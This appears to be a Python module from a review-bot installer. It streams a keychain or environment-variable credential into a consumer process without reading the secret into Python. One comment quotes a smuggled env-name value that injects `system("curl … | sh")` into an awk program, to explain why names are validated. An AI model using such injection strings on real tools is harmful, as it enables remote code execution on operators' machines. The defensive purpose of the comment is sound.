"""Declared credential sources, and reading one into a consumer without holding it.

A credential is named in the configuration — never derived from the secret it fills,
never taken from an ambient default. `CLAUDE_CODE_OAUTH_TOKEN` is a name the action
reads; which account's token stands behind it is a decision the operator writes down,
because it changes when quota does. Deriving one from the other would make the two
inseparable and the swap unexpressible. [LAW:one-source-of-truth]

Every source reads through ONE pipeline. A source is a list of processes to chain,
which is data, so adding a third kind is a value here and no new branch anywhere.
[LAW:dataflow-not-control-flow]
"""

from __future__ import annotations

import os
import re
import subprocess
import tempfile
from dataclasses import dataclass

from .shell import EffectError

#: `security`'s exit status for errSecItemNotFound, and the ONLY nonzero one that means
#: the item is absent. Measured, not assumed: `security find-generic-password -s <no
#: such item>` exits 44.
ITEM_NOT_FOUND = 44

#: Argv of a reader for one keychain item, BY SERVICE NAME. It fetches that item and
#: nothing else — the keychain is never listed, dumped, or searched by pattern, so a
#: run cannot see, log, or accidentally forward a credential it was not sent for. The
#: item name is argv; its value only ever leaves on stdout.
_FIND = ["security", "find-generic-password", "-s"]

#: What a variable name may spell, which is what `execve` and every shell already
#: agree on. It is enforced because `EnvCredential` interpolates the name into an awk
#: PROGRAM, so a name containing a quote would not be a name at all — it would be more
#: awk. `env:A"] ; system("curl … | sh"); x=ENVIRON["B` is a legal thing to write in a
#: repo's own `.copirate-review.yaml` today, and it yields a valid, executing program.
#: Nothing reaches it at the moment only because `present()` cannot find such a name in
#: the environment — an accident of another check, not a boundary. Making the illegal
#: name unrepresentable removes the hazard instead of relying on that.
#: [LAW:types-are-the-program]
VARIABLE_NAME = re.compile(r"\A[A-Za-z_][A-Za-z0-9_]*\Z")


@dataclass(frozen=True)
class KeychainCredential:
    """A macOS keychain generic-password item, named by its service."""

    item: str

    @property
    def description(self) -> str:
        return f"keychain item {self.item}"

    @property
    def stages(self) -> list[list[str]]:
        """Fetch the one item, then strip the newline `security -w` appends.

        `tr` is a separate process for the same reason the whole chain is one: doing
        the strip in Python would mean reading the credential into this process.
        Without it an empty item reads back as one byte of content.
        """
        return [[*_FIND, self.item, "-w"], ["tr", "-d", "\n"]]

    def present(self) -> bool:
        """Whether this machine holds the item.

        Three answers, not two: found, absent, and *could not tell* — a locked
        keychain, a denied ACL, a dismissed authorization prompt. Only the second is a
        `False`. Reading the exit status as a mere boolean folds the third into
        "absent", and the operator is then told to create a credential they are looking
        at, while the real cause goes unnamed. [LAW:types-are-the-program]
        """
        result = subprocess.run([*_FIND, self.item], capture_output=True, text=True)
        if result.returncode == 0:
            return True
        if result.returncode == ITEM_NOT_FOUND:
            return False
        detail = (result.stderr or result.stdout).strip()
        raise EffectError(
            f"could not read keychain item {self.item!r}: `security` exited "
            f"{result.returncode}{f' — {detail}' if detail else ''}. If the keychain is "
            f"locked, unlock it and re-run; this is not the same as the item being absent."
        )


@dataclass(frozen=True)
class EnvCredential:
    """A credential this process was started with, in an environment variable.

    Honest about what it can promise, which is less than the keychain arm promises: the
    value is in this process's environment because the operator exported it there, and
    nothing here can undo that. What this DOES guarantee is that the installer never
    copies it into a variable, never puts it in `argv` where `ps` would show it, and
    never prints it — `awk` reads it out of the environment it inherits.
    """

    var: str

    def __post_init__(self) -> None:
        # In the TYPE rather than at the one call site that parses config, because the
        # guarantee has to hold for every way one of these is built — including the
        # next one. A constraint the constructor enforces is one no caller can forget.
        # [LAW:single-enforcer]
        if not VARIABLE_NAME.match(self.var):
            raise ValueError(
                f"{self.var!r} is not an environment variable name — expected letters, "
                f"digits and underscores, not starting with a digit."
            )

    @property
    def description(self) -> str:
        return f"environment variable ${self.var}"

    @property
    def stages(self) -> list[list[str]]:
        # No `tr` stage: `printf %s` appends nothing, so there is no newline to strip.
        # The variable's NAME is in argv, which is not the secret; its value never is.
        return [["awk", f'BEGIN {{ printf "%s", ENVIRON["{self.var}"] }}']]

    def present(self) -> bool:
        return self.var in os.environ


#: Where one repo secret's value comes from. The two arms differ in what they can
#: promise and in how they fail, which is exactly why they are two types and not one
#: type with a `kind` string. [LAW:types-are-the-program]
Credential = KeychainCredential | EnvCredential


def pipe_into(credential: Credential, argv: list[str]) -> str:
    """Stream the credential into `argv`'s stdin; return its stdout.

    The value crosses from its source to the consumer over OS pipes and is never bound
    to a Python name, never passed in argv, never logged. This function orchestrates
    the chain; it cannot observe what travels through it. [LAW:effects-at-boundaries]

    Only ONE pipe in the chain is ever read by this process, and it is read last. So
    every other stream goes somewhere that cannot fill and block: the first reader's
    stderr to a temporary file, every later stage's to /dev/null. A pipe nobody drains
    until the chain finishes is a pipe the chain can deadlock on.
    [LAW:no-ambient-temporal-coupling]
    """
    stages = credential.stages
    with tempfile.TemporaryFile() as reader_errors:
        running: list[subprocess.Popen] = []
        upstream = None
        for index, stage in enumerate(stages):
            process = subprocess.Popen(
                stage,
                stdin=upstream,
                stdout=subprocess.PIPE,
                stderr=reader_errors if index == 0 else subprocess.DEVNULL,
            )
            # The FILE OBJECT is closed, never its raw descriptor: `Popen` owns that
            # descriptor and will close it again when the object is collected. Closing
            # the number twice shuts whatever else in this process has since been handed
            # that number — a failure that lands somewhere entirely unrelated.
            if upstream is not None:
                upstream.close()
            assert process.stdout is not None
            upstream = process.stdout
            running.append(process)

        assert upstream is not None
        consumer = subprocess.Popen(
            argv, stdin=upstream, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        upstream.close()

        consumer_out, consumer_err = consumer.communicate()
        for process in running:
            process.wait()
        reader_errors.seek(0)
        reader_err = reader_errors.read().decode(errors="replace").strip()

    reader = running[0]
    # Reader first, but only when the reader has something to SAY. A pipeline fails in
    # both directions: a consumer that died because its input never arrived reports a
    # closed pipe and blames the wrong end — but so does the reader, when it is the
    # CONSUMER that exited first (a rejected `gh secret set`) and the readers behind it
    # died of EPIPE, nonzero and silent. Reading the order off the exit codes alone
    # prints "reading … failed:" with nothing after the colon and throws gh's actual
    # error away. Whoever explained itself is believed. [LAW:no-silent-failure]
    if reader.returncode != 0 and reader_err:
        raise EffectError(f"reading {credential.description} failed: {reader_err}")
    if consumer.returncode != 0:
        raise EffectError(
            f"`{' '.join(argv)}` failed (exit {consumer.returncode}): {consumer_err.strip()}"
        )
    if reader.returncode != 0:
        raise EffectError(
            f"reading {credential.description} failed: the reader exited "
            f"{reader.returncode} without explanation."
        )
    return consumer_out.strip()


def is_empty(credential: Credential) -> bool:
    """Whether the source holds nothing, measured without reading it here.

    An empty value sets an empty secret — a repo whose reviewer then fails to
    authenticate on every run, for a reason nothing in the install said. The byte count
    crosses the boundary; the bytes do not. [LAW:no-silent-failure]
    """
    return int(pipe_into(credential, ["wc", "-c"])) == 0
